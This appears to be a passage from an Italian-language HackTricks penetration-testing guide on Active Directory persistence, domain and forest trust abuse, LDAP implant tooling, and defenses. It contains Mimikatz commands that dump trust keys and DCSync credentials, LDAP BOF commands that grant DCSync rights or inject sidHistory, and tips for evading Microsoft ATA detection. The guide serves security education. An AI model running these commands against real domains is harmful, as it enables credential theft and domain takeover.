All'interno di ogni **Domain Controller (DC)**, esiste un account **local administrator**. Ottenendo diritti admin su una tale macchina, l'hash dell'Administrator locale può essere estratto usando **mimikatz**. Successivamente è necessaria una modifica del registry per **abilitare l'uso di questa password**, permettendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **concedere** alcune **permessi speciali** a un **utente** su specifici oggetti di dominio che permetteranno all'utente di **escalare privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** sono usati per **memorizzare** le **permissions** che un **oggetto** ha **su** un **oggetto**. Se puoi fare anche solo una **piccola modifica** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza necessitare di essere membro di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** in memoria per stabilire una **password universale**, concedendo accesso a tutti gli account di dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **SSP** per **catturare** in **clear text** le **credentials** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo usa per **pushare attributi** (SIDHistory, SPNs...) su oggetti specificati **senza** lasciare **log** riguardo le **modifiche**. Hai bisogno di privilegi DA e di essere all'interno del **root domain**.\
Nota che se usi dati errati, appariranno log piuttosto brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo discusso di come escalare privilegi se hai **sufficienti permessi per leggere le password LAPS**. Tuttavia, queste password possono anche essere usate per **mantenere persistenza**.\
Vedi:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera la **Forest** come il perimetro di sicurezza. Questo implica che **compromettere un singolo dominio potrebbe potenzialmente portare al compromesso dell'intera Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che permette a un utente di un **dominio** di accedere a risorse in un altro **dominio**. Crea essenzialmente un legame tra i sistemi di autenticazione dei due domini, permettendo il flusso di verifiche di autenticazione. Quando i domini impostano un trust, scambiano e conservano chiavi specifiche all'interno dei loro **Domain Controllers (DCs)**, che sono cruciali per l'integrità del trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **dominio trusted**, deve prima richiedere uno speciale ticket noto come **inter-realm TGT** dal proprio DC di dominio. Questo TGT è cifrato con una **chiave di trust** condivisa da entrambi i domini. L'utente poi presenta questo TGT al **DC del dominio trusted** per ottenere un service ticket (**TGS**). Dopo la validazione dell'inter-realm TGT da parte del DC del dominio trusted, viene emesso un TGS, concedendo all'utente l'accesso al servizio.

**Passaggi**:

1. Un **client computer** in **Domain 1** inizia il processo usando il proprio **NTLM hash** per richiedere un **Ticket Granting Ticket (TGT)** dal suo **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato con successo.
3. Il client richiede poi un **inter-realm TGT** da DC1, necessario per accedere a risorse in **Domain 2**.
4. L'inter-realm TGT è cifrato con una **chiave di trust** condivisa tra DC1 e DC2 come parte del trust bidirezionale tra i domini.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2)** di **Domain 2**.
6. DC2 verifica l'inter-realm TGT usando la chiave di trust condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server in Domain 2 a cui il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è cifrato con l'hash dell'account del server, per ottenere l'accesso al servizio in Domain 2.

### Different trusts

È importante notare che **un trust può essere a 1 via o a 2 vie**. Nell'opzione a 2 vie, entrambi i domini si fidano l'uno dell'altro, ma nel trust **a 1 via** una delle due sarà il dominio **trusted** e l'altro il dominio **trusting**. In quest'ultimo caso, **potrai accedere solo alle risorse all'interno del dominio trusting dal dominio trusted**.

Se Domain A si fida di Domain B, A è il dominio trusting e B il trusted. Inoltre, in **Domain A** questo sarà un **Outbound trust**; e in **Domain B**, sarà un **Inbound trust**.

**Diversi tipi di relazioni di trust**

- **Parent-Child Trusts**: Configurazione comune all'interno della stessa forest, dove un dominio child ha automaticamente un trust transitivo bidirezionale con il dominio parent. Ciò significa che le richieste di autenticazione possono fluire senza soluzione di continuità tra parent e child.
- **Cross-link Trusts**: Detti anche "shortcut trusts", sono stabiliti tra domini child per accelerare i processi di referral. In forest complesse, i referral di autenticazione tipicamente devono viaggiare fino alla root della forest e poi scendere al dominio di destinazione. Creando cross-link, il percorso è accorciato, utile soprattutto in ambienti geograficamente distribuiti.
- **External Trusts**: Stabiliti tra domini diversi e non correlati e sono per natura non transitivi. Secondo la [documentazione Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), gli external trusts sono utili per accedere a risorse in un dominio al di fuori della forest corrente che non è connesso tramite un forest trust. La sicurezza è rafforzata tramite SID filtering con gli external trusts.
- **Tree-root Trusts**: Questi trust sono stabiliti automaticamente tra il dominio root della forest e una nuova tree root aggiunta. Sebbene non comuni, i tree-root trusts sono importanti per aggiungere nuovi domain tree a una forest, permettendo loro di mantenere un nome di dominio unico e garantendo la transitività bidirezionale. Maggiori informazioni sono disponibili nella [guida Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Questo tipo di trust è un trust bidirezionale transitivo tra due forest root domains, applicando anche SID filtering per aumentare le misure di sicurezza.
- **MIT Trusts**: Questi trust sono stabiliti con domini Kerberos non-Windows conformi a [RFC4120](https://tools.ietf.org/html/rfc4120). I MIT trusts sono più specializzati e sono pensati per ambienti che richiedono integrazione con sistemi basati su Kerberos esterni all'ecosistema Windows.

#### Altre differenze nelle **relazioni di trust**

- Una relazione di trust può anche essere **transitiva** (A trust B, B trust C, allora A trust C) o **non-transitiva**.
- Una relazione di trust può essere impostata come **bidirezionale trust** (entrambi si fidano reciprocamente) o come **one-way trust** (solo uno si fida dell'altro).

### Attack Path

1. **Enumerare** le relazioni di trust
2. Verificare se qualsiasi **security principal** (user/group/computer) ha **accesso** a risorse dell'**altro dominio**, magari tramite voci ACE o essendo in gruppi dell'altro dominio. Cercare **relazioni across domains** (il trust è stato creato probabilmente per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Compromettere** gli **account** che possono **pivotare** attraverso i domini.

Gli attaccanti possono accedere a risorse in un altro dominio tramite tre meccanismi principali:

- **Local Group Membership**: I principal potrebbero essere aggiunti a gruppi locali sulle macchine, come il gruppo “Administrators” su un server, concedendo loro controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: I principal possono anche essere membri di gruppi all'interno del dominio esterno. Tuttavia, l'efficacia di questo metodo dipende dalla natura del trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: I principal possono essere specificati in un'**ACL**, particolarmente come entità in **ACE** dentro una **DACL**, fornendo loro accesso a risorse specifiche. Per chi vuole approfondire la meccanica di ACL, DACL e ACE, il whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare i foreign security principals nel dominio. Questi saranno user/group provenienti da **un dominio/forest esterno**.

Puoi verificare questo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust del dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 trusted keys**, una per _Child --> Parent_ e un'altra per _Parent_ --> _Child_.\
> Puoi trovare quella usata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalare a Enterprise admin nel dominio child/parent abusando della trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendere come la Configuration Naming Context (NC) possa essere sfruttata è cruciale. La Configuration NC funge da repository centrale per i dati di configurazione all'interno di una foresta in ambienti Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) nella foresta, con i DC scrivibili che mantengono una copia scrivibile della Configuration NC. Per sfruttare questo, è necessario avere i privilegi **SYSTEM su un DC**, preferibilmente un DC del child.

**Link GPO to root DC site**

Il container Sites della Configuration NC include informazioni sui siti di tutti i computer uniti al dominio all'interno della foresta AD. Operando con privilegi SYSTEM su un qualsiasi DC, un attaccante può collegare GPO ai siti root dei DC. Questa azione può compromettere il dominio root manipolando le policy applicate a questi siti.

Per approfondire, si può consultare la ricerca su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vettore d'attacco prevede di mirare a gMSA privilegiati all'interno del dominio. La KDS Root key, essenziale per calcolare le password delle gMSA, è memorizzata nella Configuration NC. Con privilegi SYSTEM su un qualsiasi DC, è possibile accedere alla KDS Root key e calcolare le password di qualsiasi gMSA nella foresta.

Analisi dettagliata e guida passo-passo sono disponibili in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attacco MSA delegato complementare (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ricerche esterne aggiuntive: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi oggetti AD privilegiati. Con privilegi SYSTEM, un attaccante può modificare lo Schema AD per concedere a qualsiasi utente il controllo completo su tutte le classi. Questo potrebbe portare ad accessi non autorizzati e al controllo di nuovi oggetti AD creati.

Ulteriori letture sono disponibili su [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 permette di controllare oggetti PKI per creare un template di certificato che abilita l'autenticazione come qualsiasi utente all'interno della foresta. Poiché gli oggetti PKI risiedono nella Configuration NC, la compromissione di un DC child scrivibile permette l'esecuzione di attacchi ESC5.

Maggiori dettagli sono disponibili in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenari privi di ADCS, l'attaccante ha la capacità di predisporre i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo dominio è trusted** da uno esterno che ti conferisce **permessi non determinati** su di esso. Dovrai scoprire **quali principal del tuo dominio hanno quale accesso sul dominio esterno** e poi provare a sfruttarlo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio di foresta esterno - Unidirezionale (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **il tuo dominio** sta **concedendo** alcuni **privilegi** a principal provenienti da **domini diversi**.

Tuttavia, quando un **dominio è trusted** dal dominio che si fida, il dominio trusted **crea un utente** con un **nome prevedibile** che usa come **password la trusted password**. Ciò significa che è possibile **accedere con un utente del dominio che si fida per entrare nel dominio trusted** per enumerarlo e cercare di scalare ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il dominio trusted è trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** del domain trust (il che non è molto comune).

Un altro modo per compromettere il dominio trusted è rimanere su una macchina dove un **utente del dominio trusted può accedere** per fare login via **RDP**. Poi, l'attaccante potrebbe iniettare codice nel processo della sessione RDP e **accedere al dominio originario della vittima** da lì.  
Inoltre, se la **vittima ha montato il suo hard drive**, dal processo della **RDP session** l'attaccante potrebbe memorizzare **backdoors** nella **cartella di avvio dell'hard drive**. Questa tecnica è chiamata **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigazione dell'abuso dei domain trust

### **SID Filtering:**

- Il rischio di attacchi che sfruttano l'attributo SID history attraverso forest trusts è mitigato da SID Filtering, che è attivato di default su tutti i trust inter-forest. Questo si basa sull'assunzione che i trust intra-forest siano sicuri, considerando la forest, piuttosto che il dominio, come confine di sicurezza secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: SID Filtering potrebbe interrompere applicazioni e l'accesso degli utenti, portandone alla disattivazione occasionale.

### **Selective Authentication:**

- Per i trust inter-forest, l'uso di Selective Authentication garantisce che gli utenti delle due forest non siano autenticati automaticamente. Invece, sono necessari permessi espliciti perché gli utenti possano accedere ai domini e ai server all'interno del dominio o della forest che si fida.
- È importante notare che queste misure non proteggono contro lo sfruttamento del writable Configuration Naming Context (NC) o contro attacchi all'account di trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso di AD basato su LDAP da on-host implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Enumerazione LDAP lato implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` risolvono nomi brevi/percorso OU in DN completi ed estraggono gli oggetti corrispondenti.
- `get-object`, `get-attribute`, and `get-domaininfo` estraggono attributi arbitrari (inclusi security descriptors) oltre ai metadata forest/domain da `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` espongono candidate per roasting, impostazioni di delegation e descrittori esistenti di [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direttamente da LDAP.
- `get-acl` and `get-writable --detailed` analizzano la DACL per elencare trustee, diritti (GenericAll/WriteDACL/WriteOwner/attribute writes) e ereditarietà, fornendo target immediati per escalation di privilegi via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Le BOF di creazione oggetto (`add-user`, `add-computer`, `add-group`, `add-ou`) permettono all'operatore di mettere in stage nuovi principals o machine accounts ovunque esistano diritti sull'OU. `add-groupmember`, `set-password`, `add-attribute`, e `set-attribute` dirottano direttamente gli obiettivi una volta che vengono trovati i diritti di write-property.
- Comandi focalizzati sulle ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync` traducono WriteDACL/WriteOwner su qualsiasi oggetto AD in reset di password, controllo della membership di gruppi, o privilegi di DCSync replication senza lasciare artefatti PowerShell/ADSI. I corrispondenti `remove-*` ripuliscono gli ACE iniettati.

### Delegazione, roasting, and Kerberos abuse

- `add-spn`/`set-spn` rendono immediatamente un utente compromesso Kerberoastable; `add-asreproastable` (UAC toggle) lo marca per AS-REP roasting senza toccare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, UAC flags, o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di PowerShell remoto o RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inietta SIDs privilegiati nello SID history di un principal controllato (vedi [SID-History Injection](sid-history-injection.md)), fornendo un'ereditarietà di accesso stealth completamente via LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo a un attacker di trascinare asset in OU dove esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember`, o `add-spn`.
- Comandi di rimozione strettamente mirati (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) permettono un rapido rollback dopo che l'operatore ha raccolto credenziali o persistence, minimizzando la telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Si raccomanda che i Domain Admins siano autorizzati a loggare solo sui Domain Controllers, evitando il loro utilizzo su altri host.
- **Service Account Privileges**: I servizi non dovrebbero essere eseguiti con privilegi Domain Admin (DA) per mantenere la sicurezza.
- **Temporal Privilege Limitation**: Per attività che richiedono privilegi DA, la loro durata dovrebbe essere limitata. Questo può essere ottenuto con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Implementare deception comporta l'impostazione di trappole, come utenti o computer esca, con caratteristiche come password che non scadono o marcati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o l'aggiunta a gruppi ad alto privilegio.
- Un esempio pratico prevede l'uso di tool come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Ulteriori informazioni sul deploy di tecniche di deception si trovano su [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Indicatori sospetti includono ObjectSID atipico, logon poco frequenti, date di creazione e basso numero di bad password counts.
- **General Indicators**: Confrontare gli attributi degli oggetti esca potenziali con quelli genuini può rivelare incoerenze. Strumenti come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono assistere nell'identificare tali deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitare l'enumerazione delle sessioni sui Domain Controllers per prevenire il rilevamento da parte di ATA.
- **Ticket Impersonation**: Utilizzare chiavi **aes** per la creazione dei ticket aiuta a eludere il rilevamento non degradando a NTLM.
- **DCSync Attacks**: Si consiglia di eseguire da un non-Domain Controller per evitare il rilevamento da parte di ATA, poiché l'esecuzione diretta da un Domain Controller genererà alert.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
